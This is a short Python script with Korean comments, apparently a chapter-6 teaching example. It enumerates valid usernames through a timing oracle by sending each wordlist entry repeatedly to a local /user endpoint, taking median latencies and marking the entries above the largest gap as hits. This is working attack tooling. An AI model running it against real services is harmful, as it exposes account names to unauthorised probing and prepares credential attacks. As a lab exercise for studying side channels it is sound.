"""타이밍 오라클을 반복 표본으로 복구한다 (6장).

ffuf 는 후보당 한 번만 쏜다. 잡음이 섞이면 그 한 번이 곧 판정이라 무너진다.
후보당 N회 쏘고 중앙값을 쓰면 잡음은 평균으로 깎이고 신호는 남는다.

    python timing_probe.py wordlists/usernames.txt 9
"""

import http.client
import statistics
import sys
import time

HOST, PORT = "127.0.0.1", 8080

# 연결을 재사용한다. 요청마다 TCP 핸드셰이크를 새로 하면 그 편차가
# 타겟의 지연보다 커져서, 내 계측기가 만든 잡음을 신호로 착각하게 된다.
conn = http.client.HTTPConnection(HOST, PORT)


def sample(name: str, n: int) -> float:
    times = []
    for _ in range(n):
        t0 = time.monotonic()
        conn.request("GET", f"/user?name={name}")
        conn.getresponse().read()
        times.append((time.monotonic() - t0) * 1000)
    return statistics.median(times)


def main(path: str, n: int):
    names = [w.strip() for w in open(path) if w.strip()]
    medians = {name: sample(name, n) for name in names}

    # 임계값을 고정하지 않는다. 정렬한 뒤 가장 큰 간격에서 자른다.
    # 신호가 있으면 분포가 두 덩어리로 갈리고, 그 사이가 최대 간격이 된다.
    ranked = sorted(medians.items(), key=lambda kv: -kv[1])
    gaps = [(ranked[i][1] - ranked[i + 1][1], i) for i in range(len(ranked) - 1)]
    gap, cut = max(gaps)

    print(f"표본 {n}회 · 최대 간격 {gap:.1f}ms (상위 {cut + 1}개에서 갈림)\n")
    for i, (name, med) in enumerate(ranked):
        print(f"  {name:<16} {med:7.1f}ms  {'◀ 히트' if i <= cut else ''}")


if __name__ == "__main__":
    main(sys.argv[1], int(sys.argv[2]) if len(sys.argv) > 2 else 9)
